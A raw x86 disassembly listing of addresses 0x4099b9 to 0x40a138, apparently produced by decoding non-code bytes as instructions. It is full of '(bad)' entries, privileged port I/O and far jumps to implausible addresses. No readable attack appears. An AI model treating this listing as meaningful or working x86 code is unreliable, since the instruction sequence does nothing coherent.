  4099b9:	daa    
  4099ba:	sub    ebp,edx
  4099bc:	xchg   ebx,eax
  4099bd:	jnp    0x409a35
  4099bf:	loop   0x409a38
  4099c1:	int    0x6a
  4099c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099c4:	aaa    
  4099c5:	ret    0x1a65
  4099c8:	add    ah,BYTE PTR [ebx]
  4099ca:	inc    eax
  4099cb:	pop    esp
  4099cc:	push   eax
  4099cd:	adc    eax,0x68db6475
  4099d2:	into   
  4099d3:	scas   eax,DWORD PTR es:[edi]
  4099d4:	jne    0x409a23
  4099d6:	xchg   esi,eax
  4099d7:	(bad)  
  4099d8:	clc    
  4099d9:	ret    
  4099da:	div    DWORD PTR [esi-0x35]
  4099dd:	dec    eax
  4099de:	add    BYTE PTR [ecx+ebp*1],cl
  4099e1:	and    eax,0x6c11db6c
  4099e6:	ror    DWORD PTR [ebx+0x64],1
  4099e9:	popa   
  4099ea:	jge    0x40999f
  4099ec:	fwait
  4099ed:	jp     0x40998e
  4099ef:	jg     0x40998f
  4099f1:	dec    esi
  4099f2:	xor    eax,0x4d33547c
  4099f7:	jmp    0x40998f
  4099f9:	xor    DWORD PTR [esi],0xe7c3643c
  4099ff:	push   cs
  409a00:	mov    ds:0x2d6db1c0,eax
  409a05:	lea    edx,[esi+0x28ffd8ec]
  409a0b:	cmp    dh,BYTE PTR [edx]
  409a0d:	add    edx,DWORD PTR [ebx]
  409a0f:	sub    BYTE PTR [edi-0x1cf0f0cb],0x9e
  409a16:	stos   DWORD PTR es:[edi],eax
  409a17:	test   ecx,0x96ec9d89
  409a1d:	rol    ebp,0x8d
  409a20:	xchg   edi,eax
  409a21:	scas   al,BYTE PTR es:[edi]
  409a22:	outs   dx,BYTE PTR ds:[esi]
  409a23:	test   DWORD PTR [bp+si],ebp
  409a26:	stos   DWORD PTR es:[edi],eax
  409a27:	xchg   ecx,eax
  409a28:	jl     0x409a70
  409a2a:	test   dh,ah
  409a2c:	inc    eax
  409a2d:	sub    al,0x4d
  409a2f:	stos   DWORD PTR es:[edi],eax
  409a30:	or     dl,BYTE PTR [ebp+0x5feb6214]
  409a36:	mov    eax,0x8234d658
  409a3b:	dec    esi
  409a3c:	xor    al,BYTE PTR [edi]
  409a3e:	out    0xf7,al
  409a40:	cld    
  409a41:	mov    eax,ds:0xdf9a4849
  409a46:	pushf  
  409a47:	lahf   
  409a48:	ds test al,0x38
  409a4b:	mov    esp,0xdeaefa9e
  409a50:	outs   dx,BYTE PTR ds:[esi]
  409a51:	add    al,0xdb
  409a53:	push   0xd54e2100
  409a58:	pop    esp
  409a59:	push   esi
  409a5a:	test   eax,0x2f0f6c9
  409a5f:	or     DWORD PTR [ebx-0x24],ebp
  409a62:	rcr    DWORD PTR [ebx-0x4e1b4e85],cl
  409a68:	dec    esp
  409a69:	mov    dl,0xd9
  409a6b:	test   bh,ch
  409a6d:	add    DWORD PTR [ecx],edi
  409a6f:	jnp    0x409a4f
  409a71:	rcr    BYTE PTR [esi-0x50],0xc0
  409a75:	and    ecx,DWORD PTR [ebx-0x21]
  409a78:	sbb    eax,0x815ec7d6
  409a7d:	sahf   
  409a7e:	pusha  
  409a7f:	outs   dx,DWORD PTR ds:[esi]
  409a80:	push   esp
  409a81:	ins    BYTE PTR es:[edi],dx
  409a82:	loop   0x409aa5
  409a84:	mov    al,ds:0x61078181
  409a89:	add    ch,BYTE PTR [eax]
  409a8b:	jle    0x409b03
  409a8d:	out    0xa4,eax
  409a8f:	icebp  
  409a90:	push   edx
  409a91:	or     esi,DWORD PTR [esi]
  409a93:	dec    ebx
  409a94:	ret    0xe3c6
  409a97:	adc    eax,0xa8e3ec9c
  409a9c:	mov    dl,0xad
  409a9e:	inc    edx
  409a9f:	sub    bh,ah
  409aa1:	ja     0x409a5a
  409aa3:	cmp    eax,edi
  409aa5:	cmp    dh,BYTE PTR [edx+0x1e]
  409aa8:	ret    
  409aa9:	jo     0x409ae8
  409aab:	fsubr  st(5),st
  409aad:	mov    edx,DWORD PTR [ecx+0x73]
  409ab0:	test   BYTE PTR [ecx+0x5db2615d],dl
  409ab6:	cmp    esp,DWORD PTR [edi]
  409ab8:	or     al,0x67
  409aba:	dec    edi
  409abb:	cdq    
  409abc:	fistp  QWORD PTR [edi+edx*4-0x16]
  409ac0:	scas   al,BYTE PTR es:[edi]
  409ac1:	mov    esi,0x3c2d176e
  409ac6:	imul   ebx
  409ac8:	int3   
  409ac9:	dec    edi
  409aca:	mov    ecx,DWORD PTR [ecx-0x40]
  409acd:	push   0x2
  409acf:	out    0xd0,eax
  409ad1:	addr16 (bad) 
  409ad3:	int3   
  409ad4:	call   0x1b1ac361
  409ad9:	fchs   
  409adb:	pmullw mm4,QWORD PTR [edx+0x7e]
  409adf:	xchg   edx,eax
  409ae0:	fidivr DWORD PTR [esi+0x45ea9d8f]
  409ae6:	mov    ds:0xd5acb548,al
  409aeb:	add    edx,DWORD PTR [eax+0x3fd3dde4]
  409af1:	mov    ebx,DWORD PTR [ebp-0x79cdaadf]
  409af7:	adc    eax,0xed1b924d
  409afc:	ret    
  409afd:	fwait
  409afe:	jb     0x409b19
  409b00:	call   0xf319:0xcadda532
  409b07:	inc    esi
  409b08:	das    
  409b09:	test   BYTE PTR [ecx-0x33],dl
  409b0c:	packsswb mm2,mm0
  409b0f:	sub    eax,0x9946330e
  409b14:	fcomp  DWORD PTR [ebx+0x45]
  409b17:	jmp    DWORD PTR [eax+0x4befee5f]
  409b1d:	cmp    eax,0x87ea85ef
  409b22:	mov    esi,0x146f66f
  409b27:	pop    edi
  409b28:	sub    al,0x6d
  409b2a:	aaa    
  409b2b:	add    al,0xf2
  409b2d:	add    eax,0x8f2ed143
  409b32:	jmp    0x409ae4
  409b34:	test   eax,0x76474e35
  409b39:	mov    dh,0xb1
  409b3b:	jno    0x409b18
  409b3d:	hlt    
  409b3e:	cmc    
  409b3f:	jl     0x409b0d
  409b41:	sub    dl,ah
  409b43:	ins    DWORD PTR es:[edi],dx
  409b44:	icebp  
  409b45:	aaa    
  409b46:	loope  0x409b58
  409b48:	jno    0x409b32
  409b4a:	jo     0x409bc3
  409b4c:	mov    eax,ds:0xca4901a2
  409b51:	mov    bh,0x4f
  409b53:	mov    esi,DWORD PTR [eax+0x77]
  409b56:	pop    ebp
  409b57:	add    ch,BYTE PTR [eax+0x24]
  409b5a:	das    
  409b5b:	nop
  409b5c:	stc    
  409b5d:	xor    esp,ebx
  409b5f:	xor    BYTE PTR [edi+0x259f1d6c],bh
  409b65:	and    eax,DWORD PTR [eax+eiz*2-0x3b3b4473]
  409b6c:	(bad)  [edi+0x1d]
  409b6f:	jl     0x409b29
  409b71:	push   eax
  409b72:	dec    esp
  409b73:	mov    ds:0x586a0639,al
  409b78:	clc    
  409b79:	ret    0x94a8
  409b7c:	test   BYTE PTR [ecx+0x300bb664],ch
  409b82:	inc    ebp
  409b83:	(bad)  
  409b84:	clc    
  409b85:	les    edi,FWORD PTR [edi*8-0x159a8b6f]
  409b8c:	jecxz  0x409b91
  409b8e:	xlat   BYTE PTR ds:[ebx]
  409b8f:	add    bh,BYTE PTR [ebp+0x2beaec4c]
  409b95:	jg     0x409b4d
  409b97:	xor    al,0x72
  409b99:	xchg   ecx,eax
  409b9a:	jecxz  0x409c0a
  409b9c:	mov    ecx,0x8b663f36
  409ba1:	cmc    
  409ba2:	xchg   ecx,eax
  409ba3:	lods   al,BYTE PTR ds:[esi]
  409ba4:	mov    dl,BYTE PTR [esi+eax*1-0x44]
  409ba8:	cmp    eax,0xf97fe9d2
  409bad:	sbb    DWORD PTR [ecx-0x6034725c],esi
  409bb3:	sahf   
  409bb4:	dec    esi
  409bb5:	xchg   BYTE PTR [esi+0x8],cl
  409bb8:	jnp    0x409b4d
  409bba:	not    DWORD PTR [esi]
  409bbc:	push   edi
  409bbd:	mov    dl,0x3
  409bbf:	shl    BYTE PTR [edi+0x617a4711],1
  409bc5:	sub    dh,dl
  409bc7:	scas   eax,DWORD PTR es:[edi]
  409bc8:	jae    0x409b83
  409bca:	std    
  409bcb:	mov    ch,0x44
  409bcd:	mov    edi,0x3acd9dd0
  409bd2:	xor    eax,0xc0ec82f2
  409bd7:	shl    DWORD PTR [ecx-0x2e],0xac
  409bdb:	dec    ecx
  409bdc:	ss dec esp
  409bde:	adc    eax,0x22ea9d9c
  409be3:	adc    eax,0x443326dd
  409be8:	int3   
  409be9:	jnp    0x409be4
  409beb:	push   ecx
  409bec:	lods   eax,DWORD PTR ds:[esi]
  409bed:	das    
  409bee:	test   dl,0x10
  409bf1:	push   ss
  409bf2:	cwde   
  409bf3:	mov    eax,edx
  409bf5:	cli    
  409bf6:	popf   
  409bf7:	mov    dl,0xd
  409bf9:	pop    esi
  409bfa:	mov    al,0x5f
  409bfc:	mov    bx,WORD PTR [esi+ecx*8]
  409c00:	mov    dl,0x48
  409c02:	mov    al,ds:0xa2edc9f4
  409c07:	mov    ecx,0x8f7a9fd9
  409c0c:	inc    esp
  409c0d:	adc    eax,0xc030e609
  409c12:	mov    dh,dl
  409c14:	sub    BYTE PTR [eax+eax*8],bl
  409c17:	dec    eax
  409c18:	jno    0x409bb9
  409c1a:	call   0x4386:0xfe84199
  409c21:	std    
  409c22:	mov    ebx,0x655c194
  409c27:	pop    ecx
  409c28:	in     eax,dx
  409c29:	std    
  409c2a:	ficomp WORD PTR gs:[eax-0x18]
  409c2e:	arpl   WORD PTR [ebx-0x5b7bc246],ax
  409c34:	(bad)  
  409c35:	cmp    eax,DWORD PTR [ebx-0xe]
  409c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c39:	(bad)  
  409c3a:	mov    eax,ds:0xb3b7ef70
  409c3f:	inc    ecx
  409c40:	rol    DWORD PTR es:[esi-0x3dc3680],0x9a
  409c48:	dec    edx
  409c49:	sub    DWORD PTR [ebx+0x12e462e7],0x5de3b26b
  409c53:	fistp  QWORD PTR [eax-0x71]
  409c56:	jecxz  0x409cd1
  409c58:	fmul   DWORD PTR [ebp-0x4a]
  409c5b:	inc    esi
  409c5c:	xor    cl,BYTE PTR [edx-0x2f0c1bb9]
  409c62:	push   esi
  409c63:	or     edx,edi
  409c65:	mov    ebx,0xe99146b4
  409c6a:	jmp    0xcc34ba2a
  409c6f:	adc    ah,BYTE PTR [ecx]
  409c71:	aaa    
  409c72:	jp     0x409cbc
  409c74:	push   esi
  409c75:	lahf   
  409c76:	stos   BYTE PTR es:[edi],al
  409c77:	inc    ebx
  409c78:	xor    dl,bh
  409c7a:	(bad)  
  409c7b:	pushf  
  409c7c:	xchg   esp,eax
  409c7d:	leave  
  409c7e:	icebp  
  409c7f:	add    bh,dh
  409c81:	loop   0x409cd0
  409c83:	iret   
  409c84:	dec    eax
  409c85:	in     eax,0x37
  409c87:	add    DWORD PTR [edi-0x5b066c0f],edi
  409c8d:	and    edi,DWORD PTR [edx+ebx*8-0x21]
  409c91:	fnsave ds:0x3d8f9137
  409c97:	cld    
  409c98:	icebp  
  409c99:	cld    
  409c9a:	daa    
  409c9b:	lods   eax,DWORD PTR ds:[esi]
  409c9c:	lahf   
  409c9d:	test   eax,0xe6aeeeee
  409ca2:	lock cld 
  409ca4:	shr    DWORD PTR [eax+edi*1+0x1aecf430],1
  409cab:	in     eax,0x7c
  409cad:	jbe    0x409c8c
  409caf:	sbb    edx,DWORD PTR [ebx+0xc]
  409cb2:	or     DWORD PTR [edx-0x7aa24f10],esp
  409cb8:	push   cs
  409cb9:	pop    ebp
  409cba:	xor    al,cl
  409cbc:	or     eax,0x4d957001
  409cc1:	cmp    eax,0xfe0216a8
  409cc6:	shl    DWORD PTR [ecx],cl
  409cc8:	mov    ds:0xb3695bc0,eax
  409ccd:	(bad)  
  409cce:	out    dx,al
  409ccf:	cld    
  409cd0:	das    
  409cd1:	bound  esi,QWORD PTR [eax-0x5a]
  409cd4:	fsubr  st(5),st
  409cd6:	out    0x99,eax
  409cd8:	add    al,0x54
  409cda:	cs out 0x2c,eax
  409cdd:	pop    esp
  409cde:	xor    eax,0x150e69e1
  409ce3:	mov    es,WORD PTR [edx+0x79e96c8a]
  409ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cea:	push   ecx
  409ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cec:	and    DWORD PTR [edx+0x71bf7887],edi
  409cf2:	push   ebp
  409cf3:	test   al,0xf
  409cf5:	clc    
  409cf6:	mov    ss,WORD PTR [edi+ecx*4]
  409cf9:	cwde   
  409cfa:	addr16 mov ebp,0x82de649
  409d00:	pop    esi
  409d01:	in     al,0xb7
  409d03:	add    WORD PTR [esi],ax
  409d06:	popf   
  409d07:	inc    esi
  409d08:	and    BYTE PTR [edx],dh
  409d0a:	xor    eax,0x3f968577
  409d0f:	jbe    0x409cd9
  409d11:	xchg   esi,eax
  409d12:	clc    
  409d13:	outs   dx,DWORD PTR ds:[esi]
  409d14:	cmp    al,0x67
  409d16:	ds pop esp
  409d18:	add    al,0x16
  409d1a:	add    DWORD PTR [eax+0x30],edi
  409d1d:	and    BYTE PTR [edx-0x54],ch
  409d20:	cdq    
  409d21:	out    0x9c,al
  409d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d24:	jno    0x409cb3
  409d26:	out    dx,al
  409d27:	jmp    0x825a3846
  409d2c:	jecxz  0x409cdd
  409d2e:	hlt    
  409d2f:	pop    edx
  409d30:	mov    ah,0xc3
  409d32:	inc    edx
  409d33:	test   DWORD PTR [edx+0x4cc04c10],0xec0d21d5
  409d3d:	inc    eax
  409d3e:	(bad)  
  409d3f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  409d41:	add    esi,eax
  409d43:	and    al,0x85
  409d45:	sbb    eax,0xfa006e2a
  409d4a:	imul   ecx,ebp,0x59
  409d4d:	icebp  
  409d4e:	cmp    al,0xc8
  409d50:	push   ebx
  409d51:	aaa    
  409d52:	stc    
  409d53:	scas   eax,DWORD PTR es:[edi]
  409d54:	xchg   ebp,eax
  409d55:	dec    edi
  409d56:	pop    sp
  409d58:	cli    
  409d59:	jp     0x409d3c
  409d5b:	pop    edx
  409d5c:	ins    DWORD PTR es:[edi],dx
  409d5d:	loop   0x409dda
  409d5f:	sbb    al,0x0
  409d61:	inc    ecx
  409d62:	and    al,0x1c
  409d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d65:	dec    esp
  409d66:	shr    BYTE PTR [edi],1
  409d68:	inc    eax
  409d69:	jmp    0x7e01:0x9f145f72
  409d70:	push   0x2
  409d72:	out    0x43,eax
  409d74:	int    0x7e
  409d76:	or     al,0x3d
  409d78:	not    esi
  409d7a:	mov    eax,0xc0657a25
  409d7f:	or     al,0x7d
  409d81:	jl     0x409d9e
  409d83:	test   bl,0xe9
  409d86:	mov    ecx,0x1f6d1cb2
  409d8b:	add    ebx,DWORD PTR ds:0xdaa51e58
  409d91:	pop    edx
  409d92:	mov    ah,BYTE PTR [edi]
  409d94:	setle  ah
  409d97:	int    0xe8
  409d99:	cmp    edi,edx
  409d9b:	mov    dh,0xc7
  409d9d:	jge    0x409dad
  409d9f:	jno    0x409e14
  409da1:	push   0xb
  409da3:	sub    BYTE PTR ss:[eax-0x68684d16],ch
  409daa:	lahf   
  409dab:	scas   al,BYTE PTR es:[edi]
  409dac:	xchg   edx,eax
  409dad:	in     al,dx
  409dae:	push   ebp
  409daf:	jb     0x409e01
  409db1:	ins    BYTE PTR es:[edi],dx
  409db2:	add    al,0xbb
  409db4:	mov    ch,0x90
  409db6:	push   esi
  409db7:	pop    esp
  409db8:	adc    DWORD PTR [ebp+esi*4+0x78],edi
  409dbc:	rol    DWORD PTR [edi-0x3915679c],cl
  409dc2:	test   BYTE PTR [eax+0x2bb6d729],cl
  409dc8:	or     eax,0x78923910
  409dcd:	mov    eax,0x2d8fdb6c
  409dd2:	shl    BYTE PTR [ebp+0x5c6e7261],1
  409dd8:	jp     0x409e3d
  409dda:	(bad)  
  409ddb:	dec    edi
  409ddc:	int3   
  409ddd:	retf   
  409dde:	cmp    BYTE PTR [edx-0x9],0xf9
  409de2:	mov    al,0x50
  409de4:	jnp    0x409da3
  409de6:	cwde   
  409de7:	pusha  
  409de8:	xor    ecx,DWORD PTR [edi]
  409dea:	aad    0xbc
  409dec:	sub    dl,dl
  409dee:	(bad)  
  409def:	test   eax,0x6003c87b
  409df4:	leave  
  409df5:	sub    BYTE PTR [eax],ch
  409df7:	sub    eax,0x5264da70
  409dfc:	hlt    
  409dfd:	mov    esp,edx
  409dff:	jns    0x409d93
  409e01:	aaa    
  409e02:	inc    ebx
  409e03:	in     eax,dx
  409e04:	mov    al,0xa9
  409e06:	popa   
  409e07:	and    DWORD PTR [ebx],eax
  409e09:	cwde   
  409e0a:	sti    
  409e0b:	xor    bl,bl
  409e0d:	xchg   BYTE PTR [ebx],ch
  409e0f:	adc    eax,0x219e649
  409e14:	dec    eax
  409e15:	mov    esp,0xba5cb311
  409e1a:	lea    esp,[ecx-0x6d]
  409e1d:	sbb    eax,0x8b5a10a3
  409e22:	test   BYTE PTR [ebx],ch
  409e24:	push   ecx
  409e25:	cmp    BYTE PTR [eax+0xd9cc66e],dl
  409e2b:	or     BYTE PTR [esi],bl
  409e2d:	lahf   
  409e2e:	(bad)  
  409e2f:	loop   0x409e93
  409e31:	sub    DWORD PTR es:[edx+eax*2-0x1d5bfb4c],0xf08de3b6
  409e3d:	or     al,0x3d
  409e3f:	mov    eax,0x554a3b24
  409e44:	aaa    
  409e45:	pop    ebx
  409e46:	jmp    0x409dde
  409e48:	aam    0x85
  409e4a:	(bad)  
  409e4b:	aaa    
  409e4c:	in     eax,0x61
  409e4e:	mov    cl,0x6e
  409e50:	test   DWORD PTR [esi+0x3a180b2],0x85b3ff5b
  409e5a:	int3   
  409e5b:	adc    eax,0x5876341a
  409e60:	sub    BYTE PTR [ecx],ah
  409e62:	mov    eax,ds:0x9080d7f5
  409e67:	shl    BYTE PTR ds:[ebp+0x1024646e],0x6a
  409e6f:	mov    edx,0x5f273464
  409e74:	div    esi
  409e76:	dec    edi
  409e77:	sbb    bh,BYTE PTR [esi]
  409e79:	out    dx,al
  409e7a:	or     edx,eax
  409e7c:	xchg   esp,eax
  409e7d:	out    dx,al
  409e7e:	ss enter 0xcb41,0xe7
  409e83:	fnstenv [ebp-0x12]
  409e86:	cmp    esi,edi
  409e88:	fist   DWORD PTR [edi]
  409e8a:	ins    DWORD PTR es:[edi],dx
  409e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e8c:	push   esp
  409e8d:	stos   DWORD PTR es:[edi],eax
  409e8e:	jmp    0x2c1eda08
  409e93:	xchg   esi,eax
  409e94:	sbb    DWORD PTR [edi+0x8560fda],esi
  409e9a:	sbb    DWORD PTR [edi+0x7ad7ac87],esi
  409ea0:	push   edi
  409ea1:	data16 (bad) 
  409ea3:	lock mov ds:0xc5204017,eax
  409ea9:	aad    0x90
  409eab:	pop    ds
  409eac:	sbb    BYTE PTR [edx],dh
  409eae:	push   es
  409eaf:	sub    dh,BYTE PTR [edx+0x49]
  409eb2:	push   ebx
  409eb3:	and    BYTE PTR [esp+ecx*1],ah
  409eb6:	jle    0x409e4f
  409eb8:	ins    BYTE PTR es:[edi],dx
  409eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eba:	outs   dx,DWORD PTR ds:[esi]
  409ebb:	sbb    ebx,DWORD PTR [eax+0x30]
  409ebe:	(bad)  
  409ebf:	jg     0x409f35
  409ec1:	rcl    DWORD PTR [ebx+0x63],cl
  409ec4:	pop    ebp
  409ec5:	sbb    eax,0xa383db1f
  409eca:	add    eax,0x2ce6c712
  409ecf:	cld    
  409ed0:	and    ebx,DWORD PTR ds:0xe2f2cf0d
  409ed6:	push   0x3c
  409ed8:	daa    
  409ed9:	jb     0x409ece
  409edb:	add    eax,DWORD PTR [edi-0x29]
  409ede:	inc    edx
  409edf:	imul   esp,DWORD PTR [edi],0x4b
  409ee2:	or     al,0x9
  409ee4:	jo     0x409e82
  409ee6:	pushf  
  409ee7:	fimul  WORD PTR es:[ecx-0x64]
  409eeb:	jmp    0xb41cfdd9
  409ef0:	xchg   edi,eax
  409ef1:	sub    eax,0x67e22137
  409ef6:	sub    esp,ebp
  409ef8:	shl    BYTE PTR [edi+eax*8-0x1a60442],cl
  409eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f00:	inc    BYTE PTR [esi+0x15522d2b]
  409f06:	std    
  409f07:	out    dx,eax
  409f08:	pop    ecx
  409f09:	cmp    edx,DWORD PTR [edi-0x22]
  409f0c:	enter  0xb840,0x4e
  409f10:	out    dx,al
  409f11:	aas    
  409f12:	call   0x2184:0xd3b3ac01
  409f19:	pop    esi
  409f1a:	test   al,0xc
  409f1c:	or     ch,BYTE PTR [ecx+0x3c]
  409f1f:	gs pusha 
  409f21:	fdivr  QWORD PTR [ecx-0x4c]
  409f24:	jl     0x409fa3
  409f26:	push   esp
  409f27:	mov    esi,0xd44eee3b
  409f2c:	pop    edi
  409f2d:	or     BYTE PTR [ecx-0x5c],ah
  409f30:	jb     0x409ed8
  409f32:	sbb    BYTE PTR [ecx],bh
  409f34:	xchg   edx,eax
  409f35:	mov    cl,0xd3
  409f37:	push   edi
  409f38:	mov    DWORD PTR [ecx+0x4c],ebx
  409f3b:	mov    esp,0x5c034795
  409f40:	mov    ebp,0x5d01bac4
  409f45:	test   BYTE PTR [eax+0x2e071d55],0x6f
  409f4c:	(bad)  
  409f4e:	or     esi,DWORD PTR [ecx]
  409f50:	jg     0x409fa9
  409f52:	push   edx
  409f53:	(bad)  
  409f54:	and    al,0x88
  409f56:	or     eax,0x356a2ff5
  409f5b:	punpcklbw mm5,DWORD PTR [ebx-0x54]
  409f5f:	(bad)  
  409f60:	mov    ebp,cr4
  409f63:	shr    ch,0x5d
  409f66:	pop    es
  409f67:	retf   
  409f68:	add    cl,ch
  409f6a:	ins    DWORD PTR es:[edi],dx
  409f6b:	jne    0x409fbd
  409f6d:	push   edi
  409f6e:	add    eax,DWORD PTR [edi-0x70c4436d]
  409f74:	add    BYTE PTR [ecx],bl
  409f76:	lods   eax,DWORD PTR ds:[esi]
  409f77:	adc    ch,BYTE PTR [edx+edx*1-0x4b]
  409f7b:	mov    esi,0x7b17fc10
  409f80:	repz sub dh,BYTE PTR [eax]
  409f83:	mov    ebp,esp
  409f85:	cmp    dh,BYTE PTR [eax+0x3f5ea733]
  409f8b:	add    cl,BYTE PTR [ebx+0x3a]
  409f8e:	inc    edi
  409f8f:	jle    0x409f16
  409f91:	jle    0x409f42
  409f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f94:	fs xor eax,0x2684b65d
  409f9a:	scas   eax,DWORD PTR es:[edi]
  409f9b:	(bad)  
  409f9c:	repnz and eax,0x98d5899e
  409fa2:	pop    ss
  409fa3:	push   ecx
  409fa4:	popa   
  409fa5:	fisttp QWORD PTR [ebx]
  409fa7:	jecxz  0x409fb6
  409fa9:	and    eax,0x2e7a83b
  409fae:	adc    al,0xc9
  409fb0:	sahf   
  409fb1:	(bad)  
  409fb2:	aam    0x89
  409fb4:	aaa    
  409fb5:	pusha  
  409fb6:	mov    ebp,0x49239af8
  409fbb:	(bad)  
  409fbd:	nop
  409fbe:	rcl    DWORD PTR [edi-0xef875ad],cl
  409fc4:	or     edi,DWORD PTR [edx]
  409fc6:	call   DWORD PTR [ebx-0x70]
  409fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fca:	mov    dl,0xbf
  409fcc:	xor    bh,0x9a
  409fcf:	scas   al,BYTE PTR es:[edi]
  409fd0:	inc    ecx
  409fd1:	jle    0x409f61
  409fd3:	mov    ecx,0x2a524583
  409fd8:	cmp    edx,ebx
  409fda:	ror    BYTE PTR [ecx-0x5d],cl
  409fdd:	push   0x41
  409fdf:	test   BYTE PTR [ecx-0x76],dl
  409fe2:	push   cs
  409fe3:	fist   DWORD PTR [edi+0x52]
  409fe6:	in     eax,dx
  409fe7:	fistp  WORD PTR [edx]
  409fe9:	cmc    
  409fea:	out    dx,eax
  409feb:	out    dx,al
  409fec:	sbb    eax,0x5d103bca
  409ff1:	sub    dh,bl
  409ff3:	sbb    BYTE PTR [edx],0x3a
  409ff6:	xchg   esp,eax
  409ff7:	(bad)  
  409ff8:	pop    ebp
  409ff9:	pop    eax
  409ffa:	lock cmp ecx,DWORD PTR [esi+0x7a]
  409ffe:	bnd jle 0x40a057
  40a001:	sub    bh,BYTE PTR [ecx+eax*1+0x24]
  40a005:	and    al,0xeb
  40a007:	out    dx,al
  40a008:	shr    BYTE PTR fs:[eax+0x6d19e199],cl
  40a00f:	cwde   
  40a010:	mov    al,0xb2
  40a012:	arpl   WORD PTR [edx],bp
  40a014:	jle    0x40a07a
  40a016:	dec    ecx
  40a017:	gs out 0xf1,al
  40a01a:	jge    0x40a06f
  40a01c:	jle    0x409faf
  40a01e:	out    dx,al
  40a01f:	pop    esi
  40a020:	mov    edi,0x7970277f
  40a025:	hlt    
  40a026:	aaa    
  40a027:	mov    ds:0x2b03f8ec,eax
  40a02c:	pop    es
  40a02d:	pop    esi
  40a02e:	sti    
  40a02f:	mov    bl,0x3a
  40a031:	sbb    al,0x2b
  40a033:	inc    ebp
  40a034:	(bad)  
  40a035:	out    0x44,al
  40a037:	(bad)  
  40a038:	lahf   
  40a039:	iret   
  40a03a:	ja     0x409fee
  40a03c:	imul   ebp,ebp,0xffffff99
  40a03f:	add    al,0xbb
  40a041:	add    eax,0x74d3807b
  40a046:	sar    DWORD PTR [esi],cl
  40a048:	mov    ebp,cs
  40a04a:	xor    al,0xd2
  40a04c:	mov    bh,0x39
  40a04e:	sar    BYTE PTR ds:0x2094cd82,1
  40a054:	add    al,BYTE PTR [edx]
  40a056:	stos   BYTE PTR es:[edi],al
  40a057:	jb     0x409ff0
  40a059:	outs   dx,BYTE PTR ds:[esi]
  40a05a:	xor    esi,edi
  40a05c:	mov    ebx,0x17947318
  40a061:	les    ecx,FWORD PTR [ecx-0x6c5e595c]
  40a067:	int    0x1
  40a069:	out    0xfa,eax
  40a06b:	enter  0x7438,0x81
  40a06f:	adc    DWORD PTR [ebx-0x2476c721],edx
  40a075:	loop   0x40a046
  40a077:	and    dh,BYTE PTR [eax-0x66]
  40a07a:	pusha  
  40a07b:	clc    
  40a07c:	push   ecx
  40a07d:	icebp  
  40a07e:	xor    edi,DWORD PTR [ebx]
  40a080:	pop    ebp
  40a081:	sbb    BYTE PTR [ebx],al
  40a083:	push   ds
  40a084:	out    0x53,eax
  40a086:	cld    
  40a087:	hlt    
  40a088:	cmp    edx,esp
  40a08a:	xor    al,BYTE PTR [eax-0x4b]
  40a08d:	and    BYTE PTR [ebp+ebx*1-0x78c0472f],ah
  40a094:	arpl   WORD PTR [edi],di
  40a096:	lods   al,BYTE PTR ds:[esi]
  40a097:	lea    eax,[ecx-0x1a88d6c6]
  40a09d:	stos   BYTE PTR es:[edi],al
  40a09e:	push   esp
  40a09f:	xchg   ebx,eax
  40a0a0:	cli    
  40a0a1:	mov    esi,0x4e1ba772
  40a0a6:	and    eax,0xa8fccb6e
  40a0ab:	leave  
  40a0ac:	repnz mov edx,0x91e0bb9f
  40a0b2:	lods   eax,DWORD PTR ds:[esi]
  40a0b3:	adc    DWORD PTR [edx],eax
  40a0b5:	xchg   dl,ah
  40a0b7:	push   ss
  40a0b8:	imul   esi,DWORD PTR [ebx+0x13],0x64
  40a0bc:	retf   0x65b1
  40a0bf:	scas   al,BYTE PTR es:[edi]
  40a0c0:	mov    al,ds:0x3a147018
  40a0c5:	push   ebp
  40a0c6:	test   al,0x7d
  40a0c8:	call   0x97c3:0x8a56e66e
  40a0cf:	clc    
  40a0d0:	xor    dl,BYTE PTR [eax]
  40a0d2:	mov    ds:0x78646aab,al
  40a0d7:	loop   0x40a14f
  40a0d9:	mov    ebp,0xf699305e
  40a0de:	popa   
  40a0df:	femms  
  40a0e1:	jne    0x40a134
  40a0e3:	in     eax,0x79
  40a0e5:	jg     0x40a115
  40a0e7:	jb     0x40a168
  40a0e9:	stos   DWORD PTR es:[edi],eax
  40a0ea:	cld    
  40a0eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ec:	inc    ebx
  40a0ed:	(bad)  
  40a0ee:	xchg   ecx,eax
  40a0ef:	nop
  40a0f0:	push   es
  40a0f1:	popa   
  40a0f2:	outs   dx,DWORD PTR ds:[esi]
  40a0f3:	push   esp
  40a0f4:	shl    DWORD PTR [esi],cl
  40a0f6:	adc    eax,0xe8d9a0e6
  40a0fb:	mov    eax,ds:0xb37d7080
  40a100:	pop    eax
  40a101:	sbb    DWORD PTR [ecx],edx
  40a103:	dec    ebp
  40a104:	or     edi,ebp
  40a106:	mov    di,0x109e
  40a10a:	or     BYTE PTR [ecx],bh
  40a10c:	or     DWORD PTR [esi-0x5a8d22c6],ebx
  40a112:	inc    ebp
  40a113:	hlt    
  40a114:	scas   eax,DWORD PTR es:[edi]
  40a115:	icebp  
  40a116:	pop    esi
  40a117:	imul   edx,DWORD PTR [edx+eiz*2-0x66],0xcefdc28e
  40a11f:	xchg   esp,eax
  40a120:	mov    al,ds:0xdd396224
  40a125:	jne    0x40a0c9
  40a127:	jl     0x40a12b
  40a129:	pop    es
  40a12a:	pop    ebx
  40a12b:	dec    eax
  40a12c:	leave  
  40a12d:	stos   DWORD PTR es:[edi],eax
  40a12e:	shr    BYTE PTR [edx],1
  40a130:	aam    0x9a
  40a132:	push   edx
  40a133:	cdq    
  40a134:	inc    eax
  40a135:	je     0x40a0c9
  40a137:	inc    eax
  40a138:	das    
